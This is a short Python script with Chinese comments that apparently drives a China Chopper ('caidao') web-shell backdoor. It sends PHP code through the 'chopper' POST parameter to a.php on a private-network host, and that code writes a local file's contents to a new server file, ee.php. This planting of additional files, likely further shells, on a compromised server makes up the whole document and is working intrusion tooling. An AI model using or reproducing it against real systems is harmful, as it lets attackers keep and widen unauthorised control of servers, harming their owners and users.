import requests
from bs4 import BeautifulSoup

import os
"""
url是目标URL，filepath是本地得文件，chopper是post得参数
requests post数据格式d = {'key1': 'value1', 'key2': 'value2'}
"""
class file:
    def __init__(self, url, filepath,destfilename,chopper):
        self.url = url
        self.filepath = filepath
        self.destfilename=destfilename
        self.chopper=chopper
    def openfile(self):
        filepath = self.filepath;
        file = open(filepath, "r+");
        a = file.readlines();
        file.close();
        #此处得a是一个列表['']此种格式
        return a[0];
    def upload(self):
        url=self.url;
        phpupdate={ 'chopper':'$myfile = fopen("'+self.destfilename+'", "w") or die("Unable to open file!");' \
                  '$txt = "'+self.openfile()+'";' \
                                        'fwrite($myfile, $txt);' \
                                        'fclose($myfile);'}
        r_1=requests.post(url=url,data=phpupdate,)
        return r_1
v=file("http://192.168.136.147/caidaohoumen/a.php","a.txt","ee.php","aa");
z=v.upload();
print(z)
